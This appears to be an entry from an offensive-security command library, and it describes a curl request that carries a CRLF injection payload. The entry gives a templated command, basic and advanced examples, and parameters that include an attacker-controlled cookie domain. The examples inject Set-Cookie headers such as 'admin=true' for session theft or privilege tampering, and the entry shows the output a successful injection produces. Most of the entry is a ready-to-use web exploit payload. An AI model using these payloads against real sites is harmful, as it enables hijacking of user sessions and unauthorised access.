---
id: 44b5997b-c810-4a0f-a649-c9e9a3afce09
name: curl-send-crlf-injection-request
type: command
executor: bash
data: >-
  curl -X GET
  "http://www.example.net/vulnerable?redirect=http%3A%2F%2Fwww.example.net%2F%0D%0ASet-Cookie%3A%20session%3Dmalicious_value%3B%20Domain%3Dattacker.com%0D%0A"
  -v
output: null
created_at: '2023-04-06T03:55:55.273066+00:00'
updated_at: '2023-04-06T03:55:55.279131+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - crlf-injection
  - http-request
verified: true
validated: true
---

# Curl Send CRLF Injection Request

## Command

```bash
curl -X GET "$_TARGET_URL?$_PARAMETER=$_BASE_URL%0D%0ASet-Cookie%3A%20$_COOKIE_NAME%3D$_COOKIE_VALUE%3B%20Domain%3D$_ATTACKER_DOMAIN%0D%0A" -v
```

## Description

This command uses curl to send an HTTP GET request with a CRLF-injected payload in a URL parameter, targeting vulnerable web applications that reflect input into response headers. It exploits improper sanitization to inject a Set-Cookie header for cookie manipulation and session theft.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Base URL of the vulnerable endpoint (e.g., http://www.example.net/vulnerable) | Yes |
| $_PARAMETER | Name of the injectable parameter (e.g., redirect, url) | Yes |
| $_BASE_URL | Legitimate base path to avoid errors (e.g., http://www.example.net/) | Yes |
| $_COOKIE_NAME | Name of the malicious cookie (e.g., session) | Yes |
| $_COOKIE_VALUE | Value of the cookie, potentially including exfiltration logic | Yes |
| $_ATTACKER_DOMAIN | Domain to set for the cookie (attacker-controlled) | Yes |
| -v | Verbose mode to display request/response headers | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://www.example.net/vulnerable?redirect=http%3A%2F%2Fwww.example.net%2F%0D%0ASet-Cookie%3A%20session%3Dmalicious%0D%0A" -v
```

### Advanced Usage

```bash
curl -X POST "http://www.example.net/login" -d "message=Test%0D%0ASet-Cookie%3A%20admin%3Dtrue%3B%20Path%3D%2F%0D%0A" -v --cookie "PHPSESSID=abc123"
```

## Expected Output

Verbose output showing the request and response headers. Success is indicated by the response containing the injected Set-Cookie header after the legitimate ones, e.g.:

< HTTP/1.1 302 Found
< Location: http://www.example.net/
< Set-Cookie: session=malicious; Domain=attacker.com
< Date: Mon, 09 May 2016 14:47:29 GMT

If the injection fails, the CRLF may be sanitized, resulting in a single unbroken header.

## Related

- [[procedures/crlf-injection-for-cookie-stealing]]
- [[tools/cURL]]
